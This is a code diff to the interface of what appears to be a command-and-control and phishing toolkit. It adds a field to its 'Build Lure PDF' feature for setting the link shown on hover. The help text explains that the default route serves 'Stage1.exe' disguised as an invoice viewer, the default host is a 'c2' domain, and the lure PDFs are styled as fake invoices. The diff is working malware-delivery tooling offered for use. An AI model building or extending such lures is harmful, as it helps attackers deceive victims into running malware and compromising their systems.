@@ -3442,7 +3442,15 @@ function renderStager() {
         <label style="font-size:11px;color:var(--muted)">Button label</label>
         <input id="lpdf-btn"   value="View Full Invoice"       style="background:var(--bg2);border:1px solid var(--bg3);border-radius:6px;color:var(--text);font-size:12px;padding:5px 8px;outline:none;width:150px">
       </div>
-      <button onclick="buildLurePdf()" style="background:#3fb950;color:#0d1117;border:none;border-radius:7px;padding:8px 16px;font-size:12px;font-weight:700;cursor:pointer">&#8659; Build Lure PDF</button>
+      <button onclick="buildLurePdf()" style="background:#3fb950;color:#0d1117;border:none;border-radius:7px;padding:8px 16px;font-size:12px;font-weight:700;cursor:pointer;align-self:flex-end">&#8659; Build Lure PDF</button>
+    </div>
+    <div style="margin-top:8px;display:flex;gap:8px;align-items:center">
+      <label style="font-size:11px;color:var(--muted);white-space:nowrap">URL shown on hover:</label>
+      <input id="lpdf-dlurl" placeholder="leave blank = auto (e.g. /dl/Invoice_Q4-2024_SecureViewer.exe)"
+             style="flex:1;background:var(--bg2);border:1px solid var(--bg3);border-radius:6px;color:var(--text);font-size:11px;padding:5px 8px;outline:none;font-family:monospace">
+    </div>
+    <div style="font-size:11px;color:var(--muted);margin-top:4px">
+      Default auto-generates <code>/dl/&lt;filename&gt;_SecureViewer.exe</code> — a masked route that serves Stage1.exe under a convincing name. Override with any URL (your own domain, OneDrive link, etc.).
     </div>
   </div>
 
@@ -3651,12 +3659,14 @@ function buildStagingPdf() {
 }
 
 function buildLurePdf() {
-  const from  = encodeURIComponent(document.getElementById('lpdf-from')?.value  || 'Nexus Solutions Ltd.');
-  const to    = encodeURIComponent(document.getElementById('lpdf-to')?.value    || 'Acme Corporation');
-  const fname = document.getElementById('lpdf-fname')?.value || 'Invoice_Q4-2024';
-  const btn   = encodeURIComponent(document.getElementById('lpdf-btn')?.value   || 'View Full Invoice');
-  const host  = encodeURIComponent(window.location.hostname || 'c2.osatechcloud.cloud');
-  const url   = `${API_BASE}/api/stage/build-lure-pdf?host=${host}&from=${from}&to=${to}&filename=${encodeURIComponent(fname)}&btn=${btn}`;
+  const from   = encodeURIComponent(document.getElementById('lpdf-from')?.value  || 'Nexus Solutions Ltd.');
+  const to     = encodeURIComponent(document.getElementById('lpdf-to')?.value    || 'Acme Corporation');
+  const fname  = document.getElementById('lpdf-fname')?.value || 'Invoice_Q4-2024';
+  const btn    = encodeURIComponent(document.getElementById('lpdf-btn')?.value   || 'View Full Invoice');
+  const host   = encodeURIComponent(window.location.hostname || 'c2.osatechcloud.cloud');
+  const dlurl  = (document.getElementById('lpdf-dlurl')?.value || '').trim();
+  let url = `${API_BASE}/api/stage/build-lure-pdf?host=${host}&from=${from}&to=${to}&filename=${encodeURIComponent(fname)}&btn=${btn}`;
+  if (dlurl) url += `&dlurl=${encodeURIComponent(dlurl)}`;
   const a = document.createElement('a');
   a.href = url; a.download = fname + '.pdf';
   document.body.appendChild(a); a.click(); document.body.removeChild(a);
